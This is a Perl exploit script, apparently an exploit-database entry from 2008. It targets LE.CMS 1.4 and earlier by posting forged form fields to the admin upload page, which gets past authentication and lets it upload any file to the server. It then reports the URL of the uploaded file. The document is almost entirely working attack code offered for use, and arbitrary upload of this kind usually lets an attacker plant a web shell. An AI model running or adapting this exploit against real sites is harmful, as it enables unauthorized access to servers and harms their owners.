LE.CMS <= 1.4 Remote Arbitrary File Upload Exploit
==================================================



#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;

print <<INTRO;
- - - - - - - - - - - - - - - - - - - - - - - - - - - -
- LE.CMS <= 1.4 Remote Arbitrary File Upload Exploit  -
-                                                     -
 -                                                   - 
  -        Discovered && Coded By: t0pP8uZz         -    
   -          Discovered On: 19 JUNE 2008          -
   -                                               -
 -                                                   -
- LE.CMS suffers from a arbitrary file upload vuln..  -
- .. this exploit will upload any file to the server  -
- - - - - - - - - - - - - - - - - - - - - - - - - - - -
INTRO

print "\nEnter Target URL(ie: http://site.com): ";
    chomp(my $host=<STDIN>);
    
print "\nEnter Local File Path To Upload(ie: C:\\file.txt): ";
    chomp(my $file=<STDIN>);

my $ext   = substr $file, rindex $file, &#039;.&#039;;
my $fname = int rand 9999;
my $ua    = LWP::UserAgent->new( agent => &#039;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#039;, cookie_jar => {} );

my $re = $ua->request(POST $host . &#039;/cms/admin/upload.php&#039;,
                        Content_Type =>   &#039;form-data&#039;,
                        Content      => [ &#039;submit0&#039;  => &#039;authed&#039;, # if script reads this as TRUE then the script thinks we have already authenticated the username/password, only 0 or undef is false
                                          &#039;submit&#039;   => 1, 
                                          &#039;password&#039; => 1, # as long as this is true we should be able to upload
                                          &#039;filename&#039; => $fname,
                                          &#039;upload&#039;   => [ $file ] ] );

die "Exploit Failed, HTTP Request Failed!" unless $re->is_success;

print "File Uploaded! Location: " . $host . "/cms/images/" . $fname . $ext . "\n";
exit;




